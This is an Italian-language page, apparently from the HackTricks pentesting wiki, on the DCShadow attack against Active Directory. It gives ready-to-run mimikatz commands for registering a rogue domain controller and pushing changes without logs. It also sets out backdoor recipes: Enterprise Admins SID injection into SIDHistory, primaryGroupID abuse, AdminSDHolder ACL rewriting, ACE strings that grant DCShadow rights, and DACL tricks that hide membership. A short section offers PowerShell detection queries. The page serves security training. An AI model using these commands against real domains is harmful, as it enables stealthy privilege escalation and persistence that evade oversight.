# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Informazioni di base

Registra un **new Domain Controller** nell'**AD** e lo usa per **push attributes** (SIDHistory, SPNs...) su oggetti specifici **without** lasciare alcun **logs** riguardo le **modifiche**. Hai **need DA** privilegi ed essere all'interno del **root domain**.\
Nota che se usi dati errati, compariranno dei **logs** abbastanza brutti.

Per eseguire l'attacco ti servono 2 istanze di mimikatz. Una di esse avvierà gli RPC servers con privilegi **SYSTEM** (devi indicare qui le modifiche che vuoi effettuare), e l'altra istanza sarà usata per push the values:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Nota che **`elevate::token`** non funzionerà in una sessione `mimikatz1`, poiché eleva i privilegi del thread, ma abbiamo bisogno di elevare il **privilegio del processo**.\
Puoi anche selezionare un oggetto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Puoi applicare le modifiche da un DA o da un utente con queste autorizzazioni minime:

- Nell'**oggetto del dominio**:
- _DS-Install-Replica_ (Aggiungere/Rimuovere Replica nel Domain)
- _DS-Replication-Manage-Topology_ (Gestire la Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchronization)
- L'**oggetto Sites** (e i suoi figli) nel contenitore **Configuration**:
- _CreateChild and DeleteChild_
- L'oggetto del **computer registrato come DC**:
- _WriteProperty_ (Non Write)
- L'**oggetto target**:
- _WriteProperty_ (Non Write)

Puoi usare [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) per concedere questi privilegi a un utente non privilegiato (nota che questo lascerà alcuni log). Questo è molto più restrittivo che avere privilegi DA.\
Per esempio: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Questo significa che il nome utente _**student1**_ quando è loggato sulla macchina _**mcorp-student1**_ ha permessi DCShadow sull'oggetto _**root1user**_.

## Usare DCShadow per creare backdoor
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Abuso del gruppo primario, lacune nell'enumerazione e rilevamento

- `primaryGroupID` è un attributo separato dalla lista `member` del gruppo. DCShadow/DSInternals possono scriverlo direttamente (es., impostare `primaryGroupID=512` per **Domain Admins**) senza enforcement di LSASS sul sistema, ma AD comunque **sposta** l'utente: cambiare il PGID rimuove sempre l'appartenenza dal precedente gruppo primario (stesso comportamento per qualsiasi gruppo target), quindi non è possibile mantenere la membership del vecchio gruppo primario.
- Gli strumenti predefiniti impediscono di rimuovere un utente dal suo gruppo primario corrente (`ADUC`, `Remove-ADGroupMember`), quindi cambiare il PGID richiede tipicamente scritture dirette nella directory (DCShadow/`Set-ADDBPrimaryGroup`).
- La segnalazione delle appartenenze è incoerente:
- **Include** i membri derivati dal gruppo primario: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Omette** i membri derivati dal gruppo primario: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit ispezionando `member`, `Get-ADUser <user> -Properties memberOf`.
- I controlli ricorsivi possono non rilevare i membri del gruppo primario se il **gruppo primario è a sua volta annidato** (es., il PGID dell'utente punta a un gruppo annidato dentro Domain Admins); `Get-ADGroupMember -Recursive` o filtri LDAP ricorsivi non restituiranno quell'utente a meno che la ricorsione non risolva esplicitamente i gruppi primari.
- Trucchi DACL: gli attaccanti possono **negare ReadProperty** su `primaryGroupID` sull'utente (o sull'attributo `member` del gruppo per gruppi non protetti da AdminSDHolder), nascondendo l'appartenenza effettiva dalla maggior parte delle query PowerShell; `net group` risolverà comunque la membership. I gruppi protetti da AdminSDHolder ripristineranno tali negazioni.

Esempi di rilevamento/monitoraggio:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Verifica incrociata dei gruppi privilegiati confrontando l'output di `Get-ADGroupMember` con `Get-ADGroup -Properties member` o ADSI Edit per individuare discrepanze introdotte da `primaryGroupID` o attributi nascosti.

## Shadowception - Concedere permessi a DCShadow usando DCShadow (no modified permissions logs)

Dobbiamo aggiungere i seguenti ACE con il SID del nostro utente alla fine:

- Sull'oggetto dominio:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Sull'oggetto computer dell'attaccante: `(A;;WP;;;UserSID)`
- Sull'oggetto utente target: `(A;;WP;;;UserSID)`
- Sull'oggetto Sites nel contenitore Configuration: `(A;CI;CCDC;;;UserSID)`

Per ottenere l'ACE corrente di un oggetto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Nota che in questo caso devi effettuare **diverse modifiche**, non solo una. Quindi, nella **sessione mimikatz1** (RPC server) usa il parametro **`/stack` per ogni modifica** che vuoi applicare. In questo modo dovrai eseguire **`/push`** una sola volta per applicare tutte le modifiche in sospeso sul rogue server.

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## References

- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
